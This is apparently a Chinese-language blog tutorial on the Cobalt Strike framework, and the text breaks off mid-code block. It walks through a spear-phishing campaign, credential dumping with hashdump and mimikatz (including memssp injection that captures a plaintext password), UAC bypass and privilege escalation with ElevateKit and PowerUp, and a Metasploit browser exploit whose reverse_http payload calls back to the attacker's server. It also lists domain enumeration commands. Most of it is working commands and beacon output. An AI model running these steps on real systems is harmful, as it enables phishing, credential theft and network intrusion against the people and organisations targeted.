title="钓鱼邮件"></a><strong>钓鱼邮件</strong></h6><p>鱼叉式网络钓鱼攻击针对特定组织内的特定目标个体，相对于普通钓鱼攻击来说针对的目标更加精准，所以形象的成为鱼叉钓鱼攻击</p><p>当进行攻击的骇客锁定目标后，会以电子邮件的方式，假冒该公司或组织的名义寄发难以辨真伪之档案，诱使员工进一步登录其账号密码，使攻击者可以以此借机安装特洛伊木马或其他间谍软件，窃取机密；或于员工时常浏览之网页中置入病毒自动下载器，并持续更新受感染系统内之变种病毒，使使用者穷于应付。由于鱼叉式网络钓鱼锁定之对象并非一般个人，而是特定公司、组织之成员，故受窃之资讯已非一般网络钓鱼所窃取之个人资料，而是其他高度敏感性资料，如知识产权及商业机密</p><p>比较常见的鱼叉攻击就是发钓鱼邮件攻击，接下来使用CS来进行演示</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/7991b5b1a8525572be53e7648988d156.png" alt="image-20211202174355081"></p><p>基本步骤</p><ol><li><p>创建一个目标清单</p></li><li><p>制作一个邮件模板或者使用之前制作好的模板，制作克隆网站</p></li><li><p>选择一个用来发送邮件的邮件服务器</p></li><li><p>发送邮件</p></li></ol><p><strong>1.创建目标清单</strong><br>目标清单就是一个包含多个邮箱地址的txt文本文件，每行包含一个目标</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">test@163.comVictim</span><br><span class="line">test2@163.comVictim2</span><br></pre></td></tr></table></figure><p>前面的部分为后面的部分为对于受害者的备注信息，中间用tab键分隔<br>这样一个目标清单制作好了</p><p>2.制作邮件模板</p><p>在邮箱中找到合适的邮件，选择显示邮件原文，复制另存为txt文件就行</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230109132944986.png" alt="image-20230109132944986" style="zoom: 50%;" /><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230109132843786.png" alt="image-20230109132843786" style="zoom: 33%;" /><p><strong>3.选择邮件服务器</strong></p><p>我这里直接使用的163的邮箱(手动开启SMTP POP3服务全开)</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/1f4233df0f635ba7c9ef759a3fc84b5d.png" alt="image-20211202195115072" style="zoom: 67%;" /><p><strong>4.发送邮件</strong></p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/0830e6116824d1c69f38cc1126d101f5.png" alt="image-20211202181501438"></p><p>EmbedURL 选择生成的克隆网站链接</p><p>BounceTo，Bounce To为退回邮件接收地址，注意要和配置邮件服务器时填的邮箱一致</p><p>Preview按钮可以查看邮件模块效果</p><p>设置邮箱信息</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230109132051940.png" alt="image-20230109132051940" style="zoom:50%;" /><p>注意：该密码非邮箱密码，而是开启stmp服务时授权码，使用SSL，163邮箱的25端口可能会连不通，用465端口</p><p>send</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230109133241835.png" alt="image-20230109133241835" style="zoom: 43%;" /><p>收到钓鱼邮件</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230109131658056.png" alt="image-20230109131658056" style="zoom: 33%;" /><p>点击链接跳转到设置的url</p><p>可以拓展很多其他用法，比如带上木马附件，跳转链接为恶意链接等……</p><p><strong>凭证和哈希获取</strong></p><p>想要获取凭证信息，可以在管理员权限的会话处右击选择<code>Access --&gt; Dump Hashes</code>，或者在控制台中使用<code>hashdump</code>命令。</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20220214112236.png" alt="image-20220214112235725"></p><p>想获取当前用户的密码，可以运行<code>mimikatz</code>，右击管理员权限会话选择<code>Access --&gt; Run Mimikatz</code>，或在控制台运行<code>logonpasswords</code>命令。</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20220214112330.png" alt="image-20220214112328803"></p><p>在<code>View --&gt; Credentials</code>下可以查看到<code>hashdump</code>与<code>mimikatz</code>获取的数据。</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20220214112356.png" alt="image-20220214112354732"></p><p> </p><h5 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h5><p>在 Beacon 中集成了 mimikatz ，mimikatz 执行命令有三种形式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz [module::command] &lt;args&gt; 运行 mimikatz 命令</span><br><span class="line">mimikatz [!module::command] &lt;args&gt;强制提升到 SYSTEM 权限再运行命令，因为一些命令只有在 SYSTEM 身份下才能被运行</span><br><span class="line">mimikatz [@module::command] &lt;args&gt;使用当前 Beacon 的访问令牌运行 mimikatz 命令</span><br></pre></td></tr></table></figure><p>下面是一些<code>mimikatz</code>命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">!lsadump::cache 获取缓存凭证，默认情况下 Windows 会缓存最近10个密码哈希</span><br><span class="line">!lsadump::sam   获取本地账户密码哈希，该命令与 hashdump 比较类似</span><br><span class="line">misc::cmd       如果注册表中禁用了 CMD ，就重新启用它</span><br><span class="line">!misc::memssp 注入恶意的 Windows SSP 来记录本地身份验证凭据，这个凭证存储在“C:\windows\system32\mimilsa.log”中</span><br><span class="line">misc::skeleton   该命令仅限域内使用。该命令会给所有域内用户添加一个相同的密码，域内所有的用户都可以使用这个密码进行认证，同时原始密码也可以使用,其原理是对 lsass.exe 进行注入，重启后会失效。</span><br><span class="line">process::suspend [pid] 挂起某个进程，但是不结束它</span><br><span class="line">process::resume [pid] 恢复挂起的进程</span><br></pre></td></tr></table></figure><p>以上的这些只是<code>mimikatz</code>能做事情的一小部分，下面看看<code>!misc::memssp</code>的使用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mimikatz !misc::memssp</span><br><span class="line">cd C:\Windows\system32</span><br><span class="line">shell dir mimilsa.log</span><br><span class="line">shell type mimilsa.log</span><br></pre></td></tr></table></figure><p>详细运行过程：</p><p>首先运行<code>mimikatz !misc::memssp</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; mimikatz !misc::memssp</span><br><span class="line">[*] Tasked beacon to run mimikatz&#x27;s !misc::memssp command</span><br><span class="line">[+] host called home, sent: 1006151 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">Injected =)</span><br></pre></td></tr></table></figure><p>接下来来到<code>C:\Windows\system32</code>目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; cd C:\Windows\system32</span><br><span class="line">[*] cd C:\Windows\system32</span><br><span class="line">[+] host called home, sent: 27 bytes</span><br><span class="line"> </span><br><span class="line">beacon&gt; shell dir mimilsa.log</span><br><span class="line">[*] Tasked beacon to run: dir mimilsa.log</span><br><span class="line">[+] host called home, sent: 46 bytes</span><br><span class="line">[+] received output:</span><br><span class="line"> 驱动器 C 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 BE29-9C84</span><br><span class="line"> </span><br><span class="line"> C:\Windows\system32 的目录</span><br><span class="line"> </span><br><span class="line">2020/07/23  21:47                24 mimilsa.log</span><br><span class="line">               1 个文件             24 字节</span><br><span class="line">               0 个目录 17,394,728,960 可用字节</span><br></pre></td></tr></table></figure><p>可以看到是存在<code>mimilsa.log</code>文件的，此时待目标主机重新登录，比如电脑锁屏后用户进行登录。</p><p>查看<code>mimilsa.log</code>文件内容。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell type mimilsa.log</span><br><span class="line">[*] Tasked beacon to run: type mimilsa.log</span><br><span class="line">[+] host called home, sent: 47 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">[00000000:000003e5] \    </span><br><span class="line">[00000000:002b99a7] WIN-75F8PRJM4TP\Administrator    Password123!</span><br></pre></td></tr></table></figure><p>成功获取到当前登录用户的明文密码。</p><h5 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h5><p>自 Windows vista 开始，Windows 系统引进了用户账户控制机制，即 UAC<code>User Account Control</code>机制，UAC 机制在 Win 7中得到了完善。UAC 与 UNIX 中的 sudo 工作机制十分相似，平时用户以普通权限工作，当用户需要执行特权操作时，系统会询问他们是否要提升权限。</p><p>此时系统用户可分为以下三种等级：</p><p>高：管理员权限</p><p>中：一般用户权限</p><p>低：受限制的权限</p><p>使用<code>whoami /groups</code>命令可以看到当前用户所在的组以及权限，使用<code>net localgroup administrators</code>可以查看当前在管理员组里的用户名。</p><p><strong>提权操作</strong></p><p>当某些操作需要管理员权限，而当前用户权限只有一般用户权限时，就需要提权操作了。</p><p>在 CS 中有以下几种提权操作：</p><p><code>bypassuac</code>：将本地中级管理员权限提升至本地高级管理员权限，适用于Win 7 及以上的系统。</p><p><code>elevate</code>：将任意用户的权限提升至系统权限，适用于2018年11月更新之前的 Win 7 和 Win 10 系统。</p><p><code>getsystem</code>：将本地高级管理员权限提升至系统权限。</p><p><code>runas</code>：使用其他用户的凭证来以其他用户身份运行一个命令，该命令不会返回任何输出。</p><p><code>spawnas</code>：使用其他用户的凭证来以其他用户身份派生一个会话，这个命令派生一个临时的进程并将 payload stage 注入进那个进程</p><p><strong>Spawn As</strong></p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230110121933496.png" alt="image-20230110121933496" style="zoom:50%;" /><p>首先，右击待提权的会话，选择<code>Access --&gt; Spawn As</code>，输入目标系统用户身份信息，其中域信息填写一个“点”代表本地用户，监听器这里选择的 SMB 监听器，之后点击运行就能看到对应的用户上线了。</p><p><strong>Bypass UAC</strong> </p><p>Bypass UAC 有两个步骤，分别是：</p><p>1、利用 UAC 漏洞来获取一个特权文件副本</p><p>2、使用 DLL 劫持进行代码执行</p><p>首先使用<code>shell whoami /groups</code>查看当前上线主机用户的所属组及 UAC 等级</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230110122103644.png" alt="image-20230110122103644" style="zoom:67%;" /><p>通过返回信息可以看出，当前用户为管理员权限，UAC 等级为中，此时可以使用<code>bypassuac</code>进行提权。</p><p>首先，右击会话，选择<code>Access --&gt; Elevate</code>，这里选择一个 SMB Beacon，Exploit 选择<code>uac-token-duplication</code>，最后 Launch 即可。</p><p>待 Beacon Check in 后，当前用户 UAC 为高权限的会话便会上线了</p><p><strong>例：</strong></p><p>由于CS自带的提权方式较少，因此这里就先加载一些网上的提权脚本，脚本下载地址：<a href="https://github.com/rsmudge/ElevateKit">https://github.com/rsmudge/ElevateKit</a></p><p>下载之后，打开<code>Cobalt Strike --&gt; Script Manager</code> ，之后点击<code>Load</code>，选择自己刚才下载的文件中的<code>elevate.cna</code>文件</p><p>接着选择要提权的主机，右击选择<code>Access --&gt; Elevate</code>，Listener中选择刚才新建的SMB Beacon，这里的Exploit选择了ms14-058，如果使用ms14-058不能提权，就换一个Exploit进行尝试</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230110121145989.png" alt="image-20230110121145989"></p><p>顺利的情况下，就可以看到提权后的管理员权限会话了，在管理员权限的会话中，不光用户名后有个*号，其Logo也是和其他会话不同的</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230110120942138.png" alt="image-20230110120942138"  /><p><strong>PowerUp</strong></p><p>PowerUp 所做的事是寻找可能存在弱点的地方，从而帮助提权。</p><p>利用 PowerUp 进行提权需要首先导入 ps1 文件<code>powershell-import PowerUp.ps1</code>，再执行<code>powershell Invoke-AllChecks</code>命令，使用 PowerUp 脚本可以快速的帮助我们发现系统弱点，从而实现提权的目的。</p><p>其中<code>PowerUp.ps1</code>文件可从这里下载：<a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc(opens new window)</a></p><p><strong>PowerUp 的使用</strong></p><p>执行以下命令：将 ps1 文件上传到目标主机，并执行所有弱点检查。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell-import PowerUp.ps1</span><br><span class="line">powershell invoke-allchecks</span><br></pre></td></tr></table></figure><p>详细运行过程：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; powershell-import PowerUp.ps1</span><br><span class="line">[*] Tasked beacon to import: PowerUp.ps1</span><br><span class="line">[+] host called home, sent: 275084 bytes</span><br><span class="line"></span><br><span class="line">beacon&gt; powershell invoke-allchecks</span><br><span class="line">[*] Tasked beacon to run: invoke-allchecks</span><br><span class="line">[+] host called home, sent: 313 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">[*] Running Invoke-AllChecks</span><br><span class="line">[+] Current user already has local administrative privileges!</span><br><span class="line">[*] Checking for unquoted service paths...</span><br><span class="line"></span><br><span class="line">[*] Checking service executable and argument permissions...</span><br><span class="line">[+] received output:</span><br><span class="line">ServiceName                     : AeLookupSvc</span><br><span class="line">Path                            : C:\Windows\system32\svchost.exe -k netsvcs</span><br><span class="line">ModifiableFile                  : C:\Windows\system32</span><br><span class="line">ModifiableFilePermissions       : GenericAll</span><br><span class="line">ModifiableFileIdentityReference : BUILTIN\Administrators</span><br><span class="line">StartName                       : localSystem</span><br><span class="line">AbuseFunction                   : Install-ServiceBinary -Name &#x27;AeLookupSvc&#x27;</span><br><span class="line">CanRestart                      : True</span><br><span class="line">……内容太多，此处省略……</span><br><span class="line"></span><br><span class="line">[*] Checking service permissions...</span><br><span class="line">[+] received output:</span><br><span class="line">ServiceName   : AeLookupSvc</span><br><span class="line">Path          : C:\Windows\system32\svchost.exe -k netsvcs</span><br><span class="line">StartName     : localSystem</span><br><span class="line">AbuseFunction : Invoke-ServiceAbuse -Name &#x27;AeLookupSvc&#x27;</span><br><span class="line">CanRestart    : True</span><br><span class="line">……内容太多，此处省略……</span><br><span class="line"></span><br><span class="line">[*] Checking %PATH% for potentially hijackable DLL locations...</span><br><span class="line">[+] received output:</span><br><span class="line">Permissions       : GenericAll</span><br><span class="line">ModifiablePath    : C:\Windows\system32\WindowsPowerShell\v1.0\</span><br><span class="line">IdentityReference : BUILTIN\Administrators</span><br><span class="line">%PATH%            : %SystemRoot%\system32\WindowsPowerShell\v1.0\</span><br><span class="line">AbuseFunction     : Write-HijackDll -DllPath &#x27;C:\Windows\system32\WindowsPowerS</span><br><span class="line">                    hell\v1.0\\wlbsctrl.dll&#x27;</span><br><span class="line">……内容太多，此处省略……</span><br><span class="line"></span><br><span class="line">[*] Checking for AlwaysInstallElevated registry key...</span><br><span class="line">[*] Checking for Autologon credentials in registry...</span><br><span class="line"></span><br><span class="line">[*] Checking for modifidable registry autoruns and configs...</span><br><span class="line">[+] received output:</span><br><span class="line">Key            : HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\VMware Use</span><br><span class="line">                 r Process</span><br><span class="line">Path           : &quot;C:\Program Files\VMware\VMware Tools\vmtoolsd.exe&quot; -n vmusr</span><br><span class="line">ModifiableFile : @&#123;Permissions=System.Object[]; ModifiablePath=C:\Program Files</span><br><span class="line">                 \VMware\VMware Tools\vmtoolsd.exe; IdentityReference=BUILTIN\A</span><br><span class="line">                 dministrators&#125;</span><br><span class="line">……内容太多，此处省略……</span><br><span class="line"></span><br><span class="line">[*] Checking for modifiable schtask files/configs...</span><br><span class="line">[+] received output:</span><br><span class="line">TaskName     : GoogleUpdateTaskMachineCore</span><br><span class="line">TaskFilePath : @&#123;Permissions=System.Object[]; ModifiablePath=C:\Program Files (</span><br><span class="line">               x86)\Google\Update\GoogleUpdate.exe; IdentityReference=BUILTIN\A</span><br><span class="line">               dministrators&#125;</span><br><span class="line">TaskTrigger  : &lt;Triggers xmlns=&quot;http://schemas.microsoft.com/windows/2004/02/mi</span><br><span class="line">               t/task&quot;&gt;&lt;LogonTrigger&gt;&lt;Enabled&gt;true&lt;/Enabled&gt;&lt;/LogonTrigger&gt;&lt;Cal</span><br><span class="line">               endarTrigger&gt;&lt;StartBoundary&gt;2020-04-11T21:47:44&lt;/StartBoundary&gt;&lt;</span><br><span class="line">               ScheduleByDay&gt;&lt;DaysInterval&gt;1&lt;/DaysInterval&gt;&lt;/ScheduleByDay&gt;&lt;/Ca</span><br><span class="line">               lendarTrigger&gt;&lt;/Triggers&gt;</span><br><span class="line">……内容太多，此处省略……</span><br><span class="line">[*] Checking for unattended install files...</span><br><span class="line">UnattendPath : C:\Windows\Panther\Unattend.xml</span><br><span class="line"></span><br><span class="line">[*] Checking for encrypted web.config strings...</span><br><span class="line">[*] Checking for encrypted application pool and virtual directory passwords...</span><br><span class="line">[*] Checking for plaintext passwords in McAfee SiteList.xml files....</span><br><span class="line">[+] received output:</span><br><span class="line">[*] Checking for cached Group Policy Preferences .xml files....</span><br><span class="line">[+] received output:</span><br></pre></td></tr></table></figure><p>如果在自己的靶机上发现导入ps1文件失败，这可能是因为系统不允许执行不信任的脚本文件导致的。</p><p>以管理员权限打开 Powershell，运行<code>set-ExecutionPolicy RemoteSigned</code>，输入<code>Y</code>回车，此时系统便能导入<code>PowerUp.ps1</code>文件了</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PS C:\WINDOWS\system32&gt; set-ExecutionPolicy RemoteSigned</span><br><span class="line">执行策略更改</span><br><span class="line">执行策略可帮助你防止执行不信任的脚本。更改执行策略可能会产生安全风险，如 https:/go.microsoft.com/fwlink/?LinkID=135170</span><br><span class="line">中的 about_Execution_Policies 帮助主题所述。是否要更改执行策略?</span><br><span class="line">[Y] 是(Y)  [A] 全是(A)  [N] 否(N)  [L] 全否(L)  [S] 暂停(S)  [?] 帮助 (默认值为“N”): Y</span><br><span class="line">PS C:\WINDOWS\system32&gt;</span><br></pre></td></tr></table></figure><p>在运行<code>Invoke-AllChecks</code>后，便会列出当前系统中可被提权的弱点之处，之后再执行检查结果中<code>AbuseFunction</code>下的命令便能开始提权操作了。</p><p>但是我在自己本地环境中并未复现成功，执行<code>AbuseFunction</code>后的命令只能创建一个与当前登录用户相同权限的账户，没能达到提权的目的。</p><h5 id="MSF-与-CS-的结合利用"><a href="#MSF-与-CS-的结合利用" class="headerlink" title="MSF 与 CS 的结合利用"></a>MSF 与 CS 的结合利用</h5><p>如果想使用MSF对目标进行漏洞利用，再通过这个漏洞来传输Beacon的话，也是可以的。</p><p>1、首先在MSF上选择攻击模块</p><p>2、接着在MSF上设置Payload为<code>windows/meterpreter/reverse_http</code>或者<code>windows/meterpreter/reverse_https</code>，这么做是因为CS的Beacon与MSF的分阶段协议是相兼容的</p><p>3、之后在MSF中设置Payload的LHOST、LPORT为CS中Beacon的监听器IP及端口</p><p>4、然后设置 <code>DisablePayloadHandler</code> 为 True，此选项会让 MSF 避免在其内起一个 handler 来服务你的 payload 连接，也就是告诉MSF说我们已经建立了监听器，不必再新建监听器了</p><p>5、再设置 <code>PrependMigrate</code> 为 True，此选项让 MSF 前置 shellcode 在另一个进程中运行 payload stager。如果被利用的应用程序崩溃或被用户关闭，这会帮助 Beacon 会话存活</p><p>6、最后运行<code>exploit -j</code>，-j 是指作为job开始运行，即在后台运行</p><p><strong>操作</strong></p><p>在CS中新建一个HTTP Beacon，创建过程不再赘述。</p><p>1、在MSF中选择攻击模块，根据教程这里选择的<code>adobe_flash_hacking_team_uaf</code>模块，不过个人感觉现在这个模块已经不太能被利用成功了</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/browser/adobe_flash_hacking_team_uaf</span><br></pre></td></tr></table></figure><p>2、接着配置payload，这里选择revese_http payload</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set payload windows/meterpreter/revese_http</span><br><span class="line">set LHOST cs_server_ip</span><br><span class="line">set LPORT 80</span><br></pre></td></tr></table></figure><p>3、之后，配置<code>DisablePayloadHandler</code>、<code>PrependMigrate</code>为 True</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set DisablePayloadHandler True</span><br><span class="line">set PrependMigrate True</span><br></pre></td></tr></table></figure><p>4、最后，开始攻击。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit -j</span><br></pre></td></tr></table></figure><h5 id="横向扩展"><a href="#横向扩展" class="headerlink" title="横向扩展"></a>横向扩展</h5><p><strong>1、Windows 企业局域网环境介绍</strong> </p><p><strong>活动目录</strong></p><p>活动目录<code>Active Directory</code>是一种能够集中管理用户、系统和策略的技术，活动目录的一个重要概念就是 <code>域</code>。</p><p>Active Directory 存储有关网络上对象的信息，并让管理员和用户可以更容易地使用这些信息。例如 Active Directory 域服务即 AD DS 存储着有关用户账户的信息，并且使同一网络下的其他授权用户可以访问此信息。</p><p><strong>域</strong></p><p>域<code>Domain</code>即是一个管理员或者说是网络边界，在域里的用户和系统都是通过 AD进行管理的。</p><p>在域里，如果想控制服务器进行操作就需要取得域的信任。</p><p><strong>域控制器</strong></p><p>域控制器<code>Domain Controller</code>顾名思义就是一个对域里的用户和系统进行身份验证的一个系统。</p><p><strong>本地用户</strong></p><p>本地用户<code>Local User</code>就是系统上的一个标准用户。</p><p>当我们想在 Windows 命令行下指定一个本地的用户时，可以通过输入 <code>.\本地用户名</code>或者 <code>计算机名\本地用户名</code>来指定本地的用户账户，其中<code>.</code>表示计算机名。</p><p><strong>域用户</strong></p><p>域用户<code>Domain User</code>是指域控制器下的用户，如果想指定域用户，可以输入<code>域名\域用户名</code></p><p><strong>本地管理员</strong></p><p>本地管理员<code>Local Administrator</code>即是指在本地系统有管理权限的用户。</p><p><strong>域管理员</strong></p><p>域管理员<code>Domain Administrator</code>是指在域控制器上有管理权限的用户。</p><blockquote><p>注意：在 Cobalt Strike 中运行只需要根据命令类型在命令前加上 shell 或者 powershell 即可</p></blockquote><p><strong>2、主机和用户枚举</strong></p><h6 id="主机枚举"><a href="#主机枚举" class="headerlink" title="主机枚举"></a><strong>主机枚举</strong></h6><p>一些问题</p><p>当进入目标局域网时，需要弄清楚几个问题。</p><p>1、我正处在那个域上？</p><p>2、域信任关系是什么样的？</p><p>3、可以登陆哪些域？这些域上有哪些系统？目标是什么？可以获取什么？</p><p>4、系统上存放共享数据的地方在哪里？</p><p><strong>一些枚举的命令</strong></p><ul><li><p><code>net view /domain</code></p><p>枚举出当前域</p></li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; net view /domain</span><br><span class="line">Domain</span><br><span class="line"><span class="literal">-------------------------</span></span><br><span class="line">TEAMSSIX</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure><ul><li><p><code>net view /domain:[domain]</code>、<code>net group &quot;domain computers&quot; /domain</code></p><p><code>net view /domain:[domain]</code>枚举域上一个主机的列表，但不是所有主机，这个也就是在网上邻居中可以看到的内容。</p><p><code>net group &quot;domain computers&quot; /domain</code>可以获得加入到这个域中的电脑账户列表。</p></li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; net view /domain:teamssix</span><br><span class="line">服务器名称            注解</span><br><span class="line"><span class="literal">----------------------------------</span></span><br><span class="line">\\WIN<span class="literal">-72A8ERDSF2P</span></span><br><span class="line">\\WIN<span class="literal">-P2AASSD1AF1</span></span><br><span class="line">命令成功完成。</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; net <span class="built_in">group</span> <span class="string">&quot;domain computers&quot;</span> /domain</span><br><span class="line">组名     Domain Computers</span><br><span class="line">注释     加入到域中的所有工作站和服务器</span><br><span class="line">成员</span><br><span class="line"><span class="literal">----------------------------------------------</span></span><br><span class="line">WIN<span class="literal">-72A8ERDSF2P</span><span class="variable">$</span></span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure><ul><li><p><code>nltest /dclist:[domain]</code></p><p>如果想找到那个主机是域的域控服务器，可以使用<code>nltest</code>命令</p></li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; nltest /dclist:teamssix</span><br><span class="line">获得域“teamssix”中 DC 的列表(从“\\WIN<span class="literal">-P2AASSD1AF1</span>”中)。</span><br><span class="line">    WIN<span class="literal">-P2AASSD1AF1</span>.teamssix.com [<span class="type">PDC</span>]  [<span class="type">DS</span>] 站点: Default<span class="literal">-First-Site-Name</span></span><br><span class="line">此命令成功完成</span><br></pre></td></tr></table></figure><p> 当使用 32 位的 payload 运行在 64 位的系统上，并且 nltest 路径不对的时候，可能会提示没有 nltest 这个命令，这时可以尝试使用下面的命令为其指定路径</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; C:\windows\sysnative\nltest /dclist:teamssix</span><br><span class="line">获得域“teamssix”中 DC 的列表(从“\\WIN<span class="literal">-P2AASSD1AF1</span>”中)。</span><br><span class="line">    WIN<span class="literal">-P2AASSD1AF1</span>.teamssix.com [<span class="type">PDC</span>]  [<span class="type">DS</span>] 站点: Default<span class="literal">-First-Site-Name</span></span><br><span class="line">此命令成功完成</span><br></pre></td></tr></table></figure><ul><li><p><code>nslookup [name]</code>、<code>ping -n 1 -4 [name]</code></p><p>有时在 Cobalt Strike 里，我们只需要使用目标的 NetBIOS 名称，而不用在意使用 IPv4 地址或者 IPv6 地址，NetBIOS 名称是在域上每台机器的完整名称</p><p>但是如果想通过一个 IPv4 地址转换为一个 NetBIOS 名称，可以使用 nslookup 命令，或者使用 ping 发送一个包来获得主机返回的 IP 地址</p></li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 